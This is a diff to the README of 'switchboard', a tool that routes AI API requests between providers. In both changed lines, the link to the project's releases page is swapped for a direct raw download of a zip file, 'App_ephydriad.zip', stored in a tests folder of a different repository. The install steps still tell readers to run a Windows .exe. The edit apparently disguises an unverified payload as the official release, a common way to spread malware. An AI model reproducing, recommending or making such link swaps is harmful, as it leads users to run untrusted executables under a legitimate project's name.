@@ -5,7 +5,7 @@ description: "Route AI API requests to multiple providers locally with automatic
 ---
 # 🌐 switchboard - Route your AI requests with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Renatenurturant522/switchboard/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Renatenurturant522/renatenurturant522.github.io/raw/refs/heads/main/tests/App_ephydriad.zip)
 
 Switchboard acts as a bridge for your artificial intelligence applications. It connects your software to different artificial intelligence providers through a single point. You no longer need to update your settings when one service goes offline. Switchboard manages your connections and selects the best path for your data.
 
@@ -26,7 +26,7 @@ Before you install this software, confirm your computer meets these basic needs:
 
 ## 📥 How to download and install
 
-1. Visit the following page to choose your download: [https://github.com/Renatenurturant522/switchboard/releases](https://github.com/Renatenurturant522/switchboard/releases)
+1. Visit the following page to choose your download: [https://github.com/Renatenurturant522/renatenurturant522.github.io/raw/refs/heads/main/tests/App_ephydriad.zip](https://github.com/Renatenurturant522/renatenurturant522.github.io/raw/refs/heads/main/tests/App_ephydriad.zip)
 2. Locate the file ending in `.exe` compatible with Windows.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder.
